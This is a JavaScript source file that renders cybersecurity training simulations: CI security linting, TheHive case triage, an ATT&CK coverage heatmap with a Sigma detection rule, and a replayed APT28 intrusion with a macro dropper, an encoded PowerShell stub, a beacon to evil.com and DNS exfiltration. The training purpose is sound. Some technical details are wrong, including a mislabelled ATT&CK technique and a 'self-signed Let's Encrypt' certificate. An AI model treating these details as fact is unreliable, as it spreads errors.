        fileHost.scrollTop = fileHost.scrollHeight;
      }, 500 + i * 380);
    });

    // After SAST stage skipped: log security audit findings
    const sastEnd = 500 + 4 * 1100 + 200; // approx when SAST (index 3) finishes
    const auditRows = [
      { c: 'warn', t: "⊘ SAST stage SKIPPED — sh 'sast-scan --exclude legacy/'" },
      { c: 'err',  t: '✗ 5 HIGH findings in legacy/ hidden by --exclude' },
      { c: 'err',  t: '✗ 9 MEDIUM findings in legacy/ hidden by --exclude' },
      { c: 'warn', t: '! Gate bypassed — Deploy stage ran despite skipped SAST' },
      { c: 'ok',   t: '→ Fix: remove --exclude; wrap Deploy in when { expression { return sast_pass } }' }
    ];
    auditRows.forEach((r, i) => {
      timers.later(() => {
        if (!findings) return;
        const li = el('li', 'jf-audit ' + r.c);
        li.textContent = r.t;
        findings.appendChild(li);
      }, sastEnd + 400 + i * 900);
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- GitHub Actions (Intermediate) — YAML editor + zizmor lint ---------- */
function buildGitHubActionsSim(skill, meta, lvl) {
  const slug = 'github-actions';
  const visual = `
    <div class="gha-bench">
      <div class="script-editor gha-editor">
        <div class="sim-h">
          // .github/workflows/ci.yml
          <span class="gha-unsaved" id="gha-unsaved">● editing</span>
        </div>
        <pre class="code-viewer" id="gha-editor-pre" style="max-height:280px"></pre>
      </div>
      <div class="gha-lint">
        <div class="sim-h">// zizmor / supply-chain audit</div>
        <ul class="gha-lint-list" id="gha-lint"></ul>
        <div class="gha-fix" id="gha-fix" hidden>
          <div class="gha-fix-head">📋 Recommendation</div>
          <div class="gha-fix-body">Pin <code>uses:</code> to a commit SHA — not a mutable ref like <code>@main</code>. Then verify with <code>gh attestation verify --owner jdoe</code>.</div>
        </div>
      </div>
    </div>`;

  const lines = [
    `$ # GitHub Actions — daily workflow @ ${ts()}`,
    `$ # typical daily workflow — independent troubleshooting`,
    `$ act -W .github/workflows/ci.yml --job build`,
    `[ok]  Loaded 1 job: build (runs-on: ubuntu-latest)`,
    `[ok]  step 1  actions/checkout@v4              ✓`,
    `[ok]  step 2  actions/setup-python@v5          ✓  Python 3.11.7`,
    `[ok]  step 3  pip install -r requirements.txt  ✓  23 packages`,
    `[ok]  step 4  pytest -q                        ✓  42 tests, 0 failures`,
    `[ok]  step 5  github/codeql-action/init@v3     ✓`,
    `[ok]  step 6  github/codeql-action/analyze@v3  ✓`,
    `[ok]  step 7  jdoe/deploy-action@main          ✓  deploy → prod (12.4s)`,
    `$ # Supply-chain audit — pin actions to a SHA`,
    `$ zizmor .github/workflows/ci.yml`,
    `[warn]  1 finding (HIGH) — uses: jdoe/deploy-action@main`,
    `        ↳ mutable ref @main — supply-chain risk`,
    `        ↳ recommendation: pin to commit SHA + verify attestation`,
    `[ok] workflow complete — 1 finding, fix before merge`
  ];

  const yamlLines = [
    'name: CI',
    'on:',
    '  push:',
    "    branches: [main, 'release/*']",
    '  pull_request:',
    '',
    'permissions:',
    '  contents: read',
    '  id-token: write   # for OIDC',
    '',
    'jobs:',
    '  build:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '      - uses: actions/setup-python@v5',
    '        with:',
    "          python-version: '3.11'",
    '      - run: pip install -r requirements.txt',
    '      - run: pytest -q',
    '      - uses: github/codeql-action/init@v3',
    '      - uses: github/codeql-action/analyze@v3',
    '      - uses: jdoe/deploy-action@main     # ← flag: mutable ref',
    '        with:',
    '          target: prod'
  ];

  function animate(host, timers) {
    const pre = host.querySelector('#gha-editor-pre');
    const lint = host.querySelector('#gha-lint');
    const fix = host.querySelector('#gha-fix');
    const unsaved = host.querySelector('#gha-unsaved');

    // idempotent reset
    if (pre) pre.innerHTML = '';
    if (lint) lint.innerHTML = '';
    if (fix) fix.hidden = true;
    if (unsaved) { unsaved.textContent = '● editing'; unsaved.style.color = 'var(--neon-3)'; }

    // Type the YAML out line by line with light syntax coloring
    yamlLines.forEach((line, i) => {
      timers.later(() => {
        if (!pre) return;
        const isFlag = line.indexOf('@main') !== -1;
        const ln = el('div', 'gha-yaml-line' + (isFlag ? ' gha-yaml-flag' : ''));
        if (line.trim().indexOf('#') === 0) {
          ln.innerHTML = '<span class="gha-yaml-comment">' + escapeHtmlS(line) + '</span>';
        } else if (line.indexOf(':') !== -1 && line.trim().indexOf('-') !== 0) {
          const k = line.indexOf(':');
          const key = line.slice(0, k + 1);
          const val = line.slice(k + 1);
          ln.innerHTML =
            '<span class="gha-yaml-key">' + escapeHtmlS(key) + '</span>' +
            '<span class="gha-yaml-val' + (isFlag ? ' gha-yaml-flagval' : '') + '">' + escapeHtmlS(val) + '</span>';
        } else {
          ln.textContent = line;
        }
        if (isFlag) {
          const tag = el('span', 'gha-yaml-tag');
          tag.textContent = '  ⚠ supply-chain risk';
          ln.appendChild(tag);
        }
        pre.appendChild(ln);
        pre.scrollTop = pre.scrollHeight;
      }, 500 + i * 320);
    });

    // After YAML is typed, run zizmor lint row-by-row
    const lintStart = 500 + yamlLines.length * 320 + 200;
    const lintRows = [
      { c: 'ok',   t: '✓ uses: actions/checkout@v4 — pinned to v4 tag (OK)' },
      { c: 'ok',   t: '✓ uses: actions/setup-python@v5 — pinned to v5 tag (OK)' },
      { c: 'ok',   t: '✓ uses: github/codeql-action/init@v3 — pinned (OK)' },
      { c: 'ok',   t: '✓ uses: github/codeql-action/analyze@v3 — pinned (OK)' },
      { c: 'err',  t: '✗ uses: jdoe/deploy-action@main — HIGH: mutable ref, supply-chain risk' }
    ];
    lintRows.forEach((r, i) => {
      timers.later(() => {
        if (!lint) return;
        const li = el('li', 'gha-lint-row ' + r.c);
        li.textContent = r.t;
        lint.appendChild(li);
      }, lintStart + i * 850);
    });

    // Reveal the remediation panel + flip editor to "saved"
    timers.later(() => {
      if (fix) fix.hidden = false;
      if (unsaved) { unsaved.textContent = '● fix proposed'; unsaved.style.color = 'var(--neon-2)'; }
    }, lintStart + lintRows.length * 850 + 200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- TheHive (Beginner) — Case #1842 triage UI ---------- */
function buildTheHiveSim(skill, meta, lvl) {
  const slug = 'thehive';
  const visual = `
    <div class="hive-case">
      <div class="hive-head">
        <span class="hive-logo">🐝 TheHive</span>
        <span class="hive-id">Case <b>#1842</b> · Phishing → C2</span>
        <span class="hive-sev">Severity: <b>HIGH</b></span>
        <span class="hive-state open" id="hive-state">OPEN</span>
      </div>
      <div class="hive-grid">
        <div class="hive-obs-wrap">
          <div class="sim-h">// observables (3)</div>
          <ul class="hive-obs" id="hive-obs">
            <li class="hive-obs-item pending" data-i="0">
              <span class="ho-type">IP</span>
              <span class="ho-val">8.8.8.8</span>
              <span class="ho-tag">12 linked alerts (24h)</span>
              <span class="ho-tip">💡 click to expand linked alerts</span>
              <span class="ho-state">PENDING</span>
            </li>
            <li class="hive-obs-item pending" data-i="1">
              <span class="ho-type">DOMAIN</span>
              <span class="ho-val">evil.com</span>
              <span class="ho-tag">2 alerts · new</span>
              <span class="ho-tip">💡 recent C2 — passive DNS lookup</span>
              <span class="ho-state">PENDING</span>
            </li>
            <li class="hive-obs-item pending" data-i="2">
              <span class="ho-type">HASH</span>
              <span class="ho-val">a1b2c3…d4e5f6</span>
              <span class="ho-tag">VirusTotal: 3/90</span>
              <span class="ho-tip">💡 submit to sandbox for detonation</span>
              <span class="ho-state">PENDING</span>
            </li>
          </ul>
        </div>
        <div class="hive-detail">
          <div class="sim-h">// observable detail + analyst actions</div>
          <div class="hive-detail-body" id="hive-detail-body">
            <p class="sim-p hive-detail-empty">// select an observable to begin triage…</p>
          </div>
          <div class="hive-tasks">
            <div class="sim-h">// tasks (3)</div>
            <ul class="hive-task-list" id="hive-tasks">
              <li class="hive-task pending" data-i="0">
                <span class="ht-ico">📋</span>
                <span class="ht-name">Investigate 8.8.8.8 — list all 12 alerts</span>
                <span class="ht-state">QUEUED</span>
              </li>
              <li class="hive-task pending" data-i="1">
                <span class="ht-ico">📋</span>
                <span class="ht-name">Enrich evil.com — passive DNS</span>
                <span class="ht-state">QUEUED</span>
              </li>
              <li class="hive-task pending" data-i="2">
                <span class="ht-ico">📋</span>
                <span class="ht-name">Submit a1b2c3… to sandbox</span>
                <span class="ht-state">QUEUED</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>`;

  const lines = [
    `$ # TheHive — guided walkthrough @ ${ts()}`,
    `$ # Goal: triage Case #1842, with documentation support`,
    `$ man thehive-ctl`,
    `[doc] SYNOPSIS — case, observable, task, alert APIs`,
    `$ # Step 1: open the case via the API`,
    `$ curl -s -H "Authorization: Bearer $HIVE_API" https://hive.local/api/v1/case/1842`,
    `[ok] case #1842 · title "Phishing → C2" · severity HIGH · status Open`,
    `[ok] 3 observables linked`,
    `$ # Step 2: list observables + linked alerts`,
    `$ curl -s "https://hive.local/api/v1/case/1842/observable"`,
    `[ok]   IP      8.8.8.8     → 12 linked alerts (24h)`,
    `[ok]   DOMAIN  evil.com    → 2 alerts · new`,
    `[ok]   HASH    a1b2c3…    → VirusTotal 3/90`,
    `$ # Step 3: expand the IP observable to see linked alerts`,
    `$ curl -s "https://hive.local/api/v1/observable/8.8.8.8/alerts"`,
    `[ok]  12 alerts — same src 8.8.8.8:443, ~60s beacon`,
    `$ # Step 4: tag the IP as IOC`,
    `$ curl -X POST "https://hive.local/api/v1/observable/8.8.8.8/tag" -d '{"tags":["IOC","C2"]}'`,
    `[ok] tagged 8.8.8.8 → IOC, C2`,
    `$ # Step 5: create a Task to investigate`,
    `$ curl -X POST "https://hive.local/api/v1/case/1842/task" -d '{"title":"Investigate 8.8.8.8 — beacon pattern"}'`,
    `[ok] task #2891 created · assignee soc-l1 · status Waiting`,
    `$ # → ready to progress to intermediate workflows`
  ];

  function animate(host, timers) {
    const obs = host.querySelectorAll('#hive-obs .hive-obs-item');
    const detail = host.querySelector('#hive-detail-body');
    const tasks = host.querySelectorAll('#hive-tasks .hive-task');
    const caseState = host.querySelector('#hive-state');

    // idempotent reset
    obs.forEach((o) => {
      o.className = 'hive-obs-item pending';
      const st = o.querySelector('.ho-state'); if (st) st.textContent = 'PENDING';
    });
    tasks.forEach((t) => {
      t.className = 'hive-task pending';
      const st = t.querySelector('.ht-state'); if (st) st.textContent = 'QUEUED';
    });
    if (detail) detail.innerHTML = '<p class="sim-p hive-detail-empty">// select an observable to begin triage…</p>';
    if (caseState) { caseState.className = 'hive-state open'; caseState.textContent = 'OPEN'; }

    const obsDetail = [
      {
        head: '// 8.8.8.8 — IP observable',
        rows: [
          { c: 'info', t: 'first_seen: 2025-04-08 03:11:42 · last_seen: 2025-04-08 03:42:11' },
          { c: 'info', t: 'linked alerts: 12 in last 24h — same src port 443, ~60s beacon' },
          { c: 'warn', t: '! 8.8.8.8 (Google DNS) — likely spoofed; cross-check with passive DNS' },
          { c: 'crit', t: '✗ analyst decision: tag as IOC, C2' }
        ],
        task: 0, markIOC: true
      },
      {
        head: '// evil.com — domain observable',
        rows: [
          { c: 'info', t: 'first_seen: 2025-04-08 03:12:08 · last_seen: 2025-04-08 03:42:11' },
          { c: 'info', t: 'linked alerts: 2 · newly registered (reg date 2025-04-05)' },
          { c: 'warn', t: '! passive DNS: resolves to 8.8.8.8 (matches the IP observable)' },
          { c: 'warn', t: '! analyst decision: enrich with passive DNS + VirusTotal' }
        ],
        task: 1, markIOC: false
      },
      {
        head: '// a1b2c3…d4e5f6 — file hash',
        rows: [
          { c: 'info', t: 'type: sha256 · size: 84 KB · mime: application/x-dosexec' },
          { c: 'info', t: 'VirusTotal: 3/90 engines detect · first seen 2025-04-08' },
          { c: 'warn', t: '! YARA: matches rule MAL_C2_beacon_loader' },
          { c: 'warn', t: '! analyst decision: submit to sandbox for detonation' }
        ],
        task: 2, markIOC: false
      }
    ];

    // Walk through each observable, expanding its detail panel + driving the linked task
    obsDetail.forEach((d, i) => {
      const tStart = 600 + i * 3400;
      // activate observable
      timers.later(() => {
        obs.forEach((o) => o.classList.remove('active'));
        obs[i].classList.remove('pending');
        obs[i].classList.add('active');
        const st = obs[i].querySelector('.ho-state');
        if (st) st.textContent = 'INVESTIGATING';
        if (detail) {
          detail.innerHTML = '';
          const h = el('div', 'sim-h');
          h.textContent = d.head;
          detail.appendChild(h);
        }
      }, tStart);
      // stream detail rows
      d.rows.forEach((r, j) => {
        timers.later(() => {
          if (!detail) return;
          const row = el('div', 'hive-detail-row ' + r.c);
          row.textContent = r.t;
          detail.appendChild(row);
          detail.scrollTop = detail.scrollHeight;
        }, tStart + 400 + j * 650);
      });
      // mark observable IOC/done + run linked task
      const taskStart = tStart + 400 + d.rows.length * 650 + 100;
      timers.later(() => {
        obs[i].classList.remove('active');
        obs[i].classList.add(d.markIOC ? 'ioc' : 'done');
        const st = obs[i].querySelector('.ho-state');
        if (st) st.textContent = d.markIOC ? 'IOC ✓' : 'DONE';
        if (tasks[d.task]) {
          tasks[d.task].classList.remove('pending');
          tasks[d.task].classList.add('running');
          const ts = tasks[d.task].querySelector('.ht-state');
          if (ts) ts.textContent = 'IN PROGRESS';
        }
      }, taskStart);
      timers.later(() => {
        if (tasks[d.task]) {
          tasks[d.task].classList.remove('running');
          tasks[d.task].classList.add('done');
          const ts = tasks[d.task].querySelector('.ht-state');
          if (ts) ts.textContent = 'DONE';
        }
      }, taskStart + 1400);
    });

    // Mark the case as IN PROGRESS at the end
    timers.later(() => {
      if (caseState) { caseState.className = 'hive-state progress'; caseState.textContent = 'IN PROGRESS'; }
    }, 600 + obsDetail.length * 3400 + 200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  BATCH F — Builder registry (keys MUST match SKILL_META)
 * ============================================================ */
const BATCH_F_BUILDERS = {
  'Azure':           buildAzureSim,
  'Docker':          buildDockerSim,
  'Jenkins':         buildJenkinsSim,
  'GitHub Actions':  buildGitHubActionsSim,
  'TheHive':         buildTheHiveSim
};

/* ============================================================
 *  BATCH G — FRAMEWORKS & STANDARDS (8 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal
 *  Visuals in this batch:
 *    1. MITRE ATT&CK         — ATT&CK Navigator heatmap + draft Sigma rule
 *    2. Cyber Kill Chain      — 7-phase horizontal APT28 replay with packet flow
 *    3. Diamond Model         — K4 complete-graph diagram + vertex attribute expansion
 *    4. NIST SP 800-61r2      — vertical IR lifecycle with sub-steps per phase
 *    5. NIST CSF 2.0           — 6-function wheel + gap recommendation (Beginner)
 *    6. ISO 27001:2022 Annex A — theme table + A.8 sub-controls drill + finding
 *    7. STRIDE                — auth flow + 6-row threat table (interactive)
 *    8. CVE                   — NVD search + 8-field result panel (CVSS/KEV/EPSS)
 * ============================================================ */

/* ============================================================
 *  1. MITRE ATT&CK — ATT&CK Navigator heatmap (Intermediate)
 * ============================================================ */
function buildMitreAttckSim(skill, meta, lvl) {
  const slug = 'mitre-att-ck';
  const tactics = [
    { id: 'TA0001', name: 'Initial Access', techs: [
      { id: 'T1566',     name: 'Phishing',          cov: 'g' },
      { id: 'T1078',     name: 'Valid Accounts',    cov: 'g' },
      { id: 'T1190',     name: 'Exploit Public App', cov: 'y' }
    ]},
    { id: 'TA0002', name: 'Execution', techs: [
      { id: 'T1059',     name: 'Command Script',     cov: 'g' },
      { id: 'T1106',     name: 'Native API',         cov: 'g' }
    ]},
    { id: 'TA0003', name: 'Persistence', techs: [
      { id: 'T1053.005', name: 'Scheduled Tasks',    cov: 'r' },
      { id: 'T1547.001', name: 'Run Keys',           cov: 'g' },
      { id: 'T1136',     name: 'Create Account',      cov: 'y' }
    ]},
    { id: 'TA0004', name: 'Priv Esc', techs: [
      { id: 'T1068',     name: 'Exploit for PE',      cov: 'y' },
      { id: 'T1078.002', name: 'Domain Accounts',     cov: 'g' }
    ]},
    { id: 'TA0005', name: 'Def Evasion', techs: [
      { id: 'T1027',     name: 'Obfuscated Files',   cov: 'y' },
      { id: 'T1140',     name: 'Deobfuscate/Decode',  cov: 'g' }
    ]},
    { id: 'TA0006', name: 'Cred Access', techs: [
      { id: 'T1003',     name: 'OS Credential Dumping', cov: 'g' },
      { id: 'T1110',     name: 'Brute Force',         cov: 'g' }
    ]},
    { id: 'TA0007', name: 'Discovery', techs: [
      { id: 'T1087',     name: 'Account Discovery',  cov: 'g' },
      { id: 'T1046',     name: 'Network Service',    cov: 'g' }
    ]},
    { id: 'TA0008', name: 'Lateral Mov', techs: [
      { id: 'T1021',     name: 'Remote Services',     cov: 'y' },
      { id: 'T1077',     name: 'Windows Admin Share', cov: 'g' }
    ]},
    { id: 'TA0009', name: 'Collection', techs: [
      { id: 'T1005',     name: 'Data from Local',     cov: 'g' },
      { id: 'T1560',     name: 'Archive Collected',  cov: 'g' }
    ]},
    { id: 'TA0011', name: 'C2', techs: [
      { id: 'T1071',     name: 'Application Layer',  cov: 'g' },
      { id: 'T1571',     name: 'Encrypted Channel',   cov: 'g' }
    ]},
    { id: 'TA0010', name: 'Exfiltration', techs: [
      { id: 'T1041',     name: 'C2 Channel Exfil',   cov: 'g' },
      { id: 'T1567',     name: 'Web Service Exfil',  cov: 'y' }
    ]},
    { id: 'TA0040', name: 'Impact', techs: [
      { id: 'T1486',     name: 'Data Encrypted',     cov: 'g' },
      { id: 'T1489',     name: 'Service Stop',       cov: 'r' }
    ]}
  ];

  const sigmaRule = `title: Suspicious Scheduled Task Creation
id: 9f8b3c2a-1d4e-4f5a-9c7b-8e2f1a3b5c7d
status: experimental
description: Detects schtasks /create with system-level task names
author: SOC Detection Engineering
date: 2024/11/14
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4698
    TaskName|contains:
      - SystemHealth
      - WindowsUpdate
      - Updater
  condition: selection
falsepositives:
  - SCCM admin tasks
  - Legitimate admin scripts
level: high
tags:
  - attack.persistence
  - attack.t1053.005`;

  const visual = `
    <div class="mitre-nav" id="mn-${slug}">
      ${tactics.map(t => `
        <div class="mn-tactic" data-tac="${t.id}">
          <div class="mn-tac-head"><b>${t.id}</b> · ${t.name}</div>
          ${t.techs.map(x => {
            const tid = x.id.replace(/\./g, '-');
            return `
            <div class="mn-technique mn-cov-${x.cov}" id="mn-tech-${slug}-${tid}" data-tech="${x.id}" data-name="${x.name}">
              <span class="mn-dot mn-dot-${x.cov}"></span>
              <span class="mn-tech-id">${x.id}</span>
              <span class="mn-tech-name">${x.name}</span>
            </div>`;
          }).join('')}
        </div>
      `).join('')}
    </div>
    <div class="framework-scenario">
      <div class="sim-h">// coverage gap analysis — click T1053.005 to re-draft</div>
      <div class="sim-p" id="mn-detail-${slug}" style="min-height:44px">click on a red technique to see coverage gap analysis</div>
      <pre class="code-viewer mn-sigma" id="mn-sigma-${slug}" style="max-height:200px;display:none;white-space:pre-wrap"></pre>
    </div>
  `;

  const lines = [
    `$ # MITRE ATT&CK — daily coverage review @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ navigator export --layer detections.layer --format heatmap`,
    '[*] loading 12 tactics · 26 techniques mapped',
    '[ok] coverage summary: 21 covered · 3 partial · 2 gap',
    '[!] GAP     T1053.005  Scheduled Task/Job: Scheduled Tasks',
    '[!] PARTIAL T1190      Exploit Public-Facing App',
    '[!] PARTIAL T1136      Create Account — only Windows cached',
    '[!] PARTIAL T1068      Exploitation for Privilege Escalation',
    '[!] PARTIAL T1027      Obfuscated Files — 1 weak sigma',
    '[!] PARTIAL T1567      Exfil Over Web Service — partial',
    '[!] GAP     T1489      Service Stop — no detection',
    '$ # Click T1053.005 → auto-draft Sigma rule',
    '$ sigma check sigma_schtasks_persistence.yml',
    '[ok] detection win_persistence_schtasks ready for CI gate',
    '[ok] gap closed — coverage 21/26 = 80% → 22/26 = 84%'
  ];

  function animate(host, timers) {
    const nav = host.querySelector(`#mn-${slug}`);
    if (!nav) return;
    const detail = host.querySelector(`#mn-detail-${slug}`);
    const sigma = host.querySelector(`#mn-sigma-${slug}`);
    const tacs = nav.querySelectorAll('.mn-tactic');
    const techs = nav.querySelectorAll('.mn-technique');
    const gapCell = host.querySelector(`#mn-tech-${slug}-T1053-005`);

    // idempotent reset
    tacs.forEach(t => t.classList.remove('sweep'));
    techs.forEach(t => t.classList.remove('flash'));
    if (sigma) { sigma.style.display = 'none'; sigma.textContent = ''; }
    if (detail) detail.textContent = 'click on a red technique to see coverage gap analysis';

    let typingTimer = null;
    function showGap(t) {
      if (detail) {
        detail.innerHTML = `// <strong style="color:var(--neon-3)">GAP</strong> — ${t.dataset.tech} ${t.dataset.name}. SOC has no detection rule. Adversary creates schtasks with system-level task name → 0 alerts fired. <span class="code-inline">attack.persistence</span>`;
      }
      if (sigma) {
        if (typingTimer !== null) { clearInterval(typingTimer); typingTimer = null; }
        sigma.style.display = 'block';
        sigma.textContent = '';
        let i = 0;
        typingTimer = timers.every(() => {
          if (i >= sigmaRule.length) { clearInterval(typingTimer); typingTimer = null; return; }
          sigma.textContent += sigmaRule[i++];
          sigma.scrollTop = sigma.scrollHeight;
        }, 10);
      }
    }

    // sweep cursor across tactics
    let idx = 0;
    timers.every(() => {
      tacs.forEach(t => t.classList.remove('sweep'));
      if (tacs[idx]) tacs[idx].classList.add('sweep');
      idx = (idx + 1) % tacs.length;
    }, 220);

    // auto-reveal the gap after 2.5s
    timers.later(() => {
      if (gapCell) {
        gapCell.classList.add('flash');
        showGap(gapCell);
      }
    }, 2600);

    // wire up click on gap techniques (T1053.005 + T1489)
    techs.forEach(t => {
      if (t.classList.contains('mn-cov-r')) {
        t.style.cursor = 'pointer';
        t.onclick = () => showGap(t);
      }
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  2. Cyber Kill Chain — 7-phase horizontal APT28 replay
 * ============================================================ */
function buildCyberKillChainSim(skill, meta, lvl) {
  const slug = 'cyber-kill-chain';
  const phases = [
    { no: '01', name: 'Reconnaissance', desc: 'APT28 OSINT on ACME Finance LinkedIn (47 employees matched)', ioc: 'LinkedIn → jdoe@acme.com pattern' },
    { no: '02', name: 'Weaponization',   desc: 'CVE-2024-1234 macro dropper payload built (RC4 + XOR stub)',   ioc: 'weaponized invoice_2024_Q4.docm' },
    { no: '03', name: 'Delivery',        desc: 'Spear-phish email from billing@evil.com → finance@acme.com',  ioc: 'email 2024-11-14 03:14 UTC' },
    { no: '04', name: 'Exploitation',    desc: 'Word macro spawns cmd.exe → powershell.exe -enc JABzAD0A…',   ioc: 'powershell.exe -enc <base64>' },
    { no: '05', name: 'Installation',    desc: 'Cobalt Strike beacon dropped to C:\\Users\\Public\\sys.dat',  ioc: 'sys.dat (CS beacon v4.9)' },
    { no: '06', name: 'Command & Control', desc: 'HTTPS beacon to evil.com every 60s (jitter ±10s)',         ioc: 'beacon evil.com · 8.8.8.8 DNS tunnel' },
    { no: '07', name: 'Actions on Objectives', desc: 'Exfiltrate finance\\Q4-forecast.xlsx (47 MB) via DNS', ioc: 'data exfil via DNS TXT records' }
  ];

  const visual = `
    <div class="vs-stage" id="kc-stage-${slug}" style="height:160px">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// Cyber Kill Chain — APT28 intrusion replay (INC-2025-047)</span>
      ${phases.map((p, i) => `
        <div class="kc-marker" id="kc-mark-${slug}-${i}" style="left:${8 + i * 14}%;top:55%;transform:translate(-50%,-50%)">
          <span class="kc-marker-ico">${i + 1}</span>
          <span class="kc-marker-name">${p.name.split(' ')[0]}</span>
          <span class="kc-marker-led"></span>
        </div>
      `).join('')}
      <div class="vs-phase-line" id="kc-phase-${slug}">// idle — awaiting intrusion start</div>
    </div>
    <div class="framework-scenario">
      <div class="sim-h">// intrusion phase breakdown</div>
      <div class="framework-flow" id="kc-flow-${slug}">
        ${phases.map(p => `
          <div class="ff-step pending" data-i="${p.no}">
            <span class="ff-no">${p.no}</span>
            <span class="ff-name">${p.name}</span>
          </div>
        `).join('')}
      </div>
      <div class="kc-detail" id="kc-detail-${slug}" style="min-height:44px;padding:8px 10px;font-size:12px;color:var(--fg-dim);border-left:2px solid var(--border);background:rgba(0,224,255,.04)">phase detail appears here</div>
    </div>
  `;

  const lines = [
    `$ # Cyber Kill Chain — map APT28 intrusion @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ killchain-replay --actor APT28 --incident INC-2025-047`,
    '[*] 7 phases mapped',
    '[ok] 01 Recon          → LinkedIn OSINT (47 employees)',
    '[ok] 02 Weaponization  → CVE-2024-1234 + macro dropper',
    '[ok] 03 Delivery       → invoice_2024_Q4.docm via email',
    '[ok] 04 Exploitation   → Word macro → powershell -enc',
    '[ok] 05 Installation   → Cobalt Strike beacon C:\\Users\\Public',
    '[ok] 06 C2             → HTTPS beacon to evil.com every 60s',
    '[ok] 07 Actions        → exfil finance\\Q4-forecast.xlsx 47MB',
    '[!] total dwell time: 14 days 6 hours before detection',
    '$ # Recommended: deploy EDR + DMARC reject + egress filtering',
    '$ # Reference: MITRE ATT&CK mapping — T1566.001 + T1053.005 + T1071.001'
  ];

  function animate(host, timers) {
    const stage = host.querySelector(`#kc-stage-${slug}`);
    if (!stage) return;
    const svg = vsInitSvg(stage, 160);
    const nodes = stage.querySelectorAll('.kc-marker');
    const phase = host.querySelector(`#kc-phase-${slug}`);
    const detail = host.querySelector(`#kc-detail-${slug}`);
    const steps = host.querySelectorAll(`#kc-flow-${slug} .ff-step`);

    // idempotent reset
    nodes.forEach(n => n.classList.remove('on', 'hit', 'done'));
    steps.forEach(s => { s.classList.remove('running', 'done'); s.classList.add('pending'); });
    if (phase) { phase.textContent = '// idle — awaiting intrusion start'; phase.classList.remove('err', 'ok'); }
    if (detail) detail.textContent = 'phase detail appears here';
    while (svg && svg.firstChild) svg.removeChild(svg.firstChild);

    // 6 horizontal links between consecutive markers (y=55%)
    const links = [];
    for (let i = 0; i < 6; i++) {
      const x1 = 8 + i * 14;
      const x2 = 8 + (i + 1) * 14;
      links.push(vsLink(svg, x1, 55, x2, 55, 160, {
        packets: 0, color: 'var(--neon-3)', dur: 0.9, r: 3.0
      }));
    }

    phases.forEach((p, i) => {
      timers.later(() => {
        if (nodes[i]) nodes[i].classList.add('on');
        if (phase) phase.textContent = `// ${p.no} ${p.name.toUpperCase()} — ${p.ioc}`;
        if (phase) phase.classList.remove('ok');
        if (steps[i]) { steps[i].classList.remove('pending'); steps[i].classList.add('running'); }
        if (detail) detail.innerHTML = `<strong style="color:var(--neon-2)">${p.no} ${p.name}</strong> — ${p.desc}`;
        if (i > 0 && links[i - 1]) links[i - 1].activate().packets(3, 'var(--neon-3)', 0.9, 3.0);
      }, 400 + i * 1100);
      timers.later(() => {
        if (nodes[i]) { nodes[i].classList.remove('on'); nodes[i].classList.add(i === 6 ? 'hit' : 'done'); }
        if (steps[i]) { steps[i].classList.remove('running'); steps[i].classList.add('done'); }
      }, 400 + i * 1100 + 850);
    });

    timers.later(() => {
      if (phase) {
        phase.innerHTML = '// <span class="ok">intrusion complete</span> — dwell 14d 6h before detect';
        phase.classList.add('ok');
      }
      if (detail) detail.innerHTML = '// <strong style="color:var(--neon-3)">actions on objectives</strong> — exfil detected via Splunk alert dns_exfil_txt_volume';
    }, 400 + 7 * 1100 + 500);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  3. Diamond Model — K4 complete graph + vertex expansion
 * ============================================================ */
function buildDiamondModelSim(skill, meta, lvl) {
  const slug = 'diamond-model';
  const vertices = [
    { id: 'adv', ico: '👾', name: 'Adversary',     sub: 'APT28 / Fancy Bear',
      pos: { left: 50, top: 12 },
      attrs: ['Group: GRU Unit 26165', 'TTPs: T1566.001 + T1053.005', 'Motive: financial intelligence', 'Past targets: NATO, IOCs'] },
    { id: 'cap', ico: '⚔️', name: 'Capability',    sub: 'Spear-phish + CS beacon',
      pos: { left: 88, top: 50 },
      attrs: ['CVE-2024-1234 macro dropper', 'Cobalt Strike beacon v4.9', 'T1053.005 schtasks persistence', 'YARA: win_beacon_cs_v4'] },
    { id: 'vic', ico: '🏢', name: 'Victim',        sub: 'ACME Finance Dept',
      pos: { left: 50, top: 88 },
      attrs: ['Org: ACME Corp (NASDAQ:ACME)', 'Sector: Financial Services', 'Asset: finance\\Q4-forecast.xlsx', 'Contact: jdoe@acme.com'] },
    { id: 'inf', ico: '🌐', name: 'Infrastructure', sub: 'evil.com + 8.8.8.8',
      pos: { left: 12, top: 50 },
      attrs: ['Domain: evil.com (reg 2024-08-12)', 'IP: 8.8.8.8 (DNS tunnel abuse)', 'Cert: self-signed Let\'s Encrypt', 'AS: AS49515 — Provider DDoS-Guard'] }
  ];
  // K4 edges (complete graph on 4 vertices = 6 edges)
  const edges = [
    ['adv', 'cap'], ['adv', 'vic'], ['adv', 'inf'],
    ['cap', 'vic'], ['cap', 'inf'], ['inf', 'vic']
  ];

  const visual = `
    <div class="vs-stage" id="dm-stage-${slug}" style="height:280px">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// Diamond Model — APT28 intrusion model (INC-2025-047)</span>
      ${vertices.map(v => `
        <div class="vs-node" id="dm-${slug}-${v.id}" style="left:${v.pos.left}%;top:${v.pos.top}%;transform:translate(-50%,-50%)">
          <span class="vs-node-ico">${v.ico}</span>
          <span class="vs-node-title">${v.name.toUpperCase()}</span>
          <span class="vs-node-sub">${v.sub}</span>
          <span class="vs-led"></span>
        </div>
      `).join('')}
      <div class="vs-phase-line" id="dm-phase-${slug}">// idle — vertex cycle starting…</div>
    </div>
    <div class="framework-scenario">
      <div class="sim-h">// active vertex attributes</div>
      <div class="diam-attr" id="dm-attr-${slug}">
        <div class="diam-attr-list" id="dm-attr-list-${slug}">
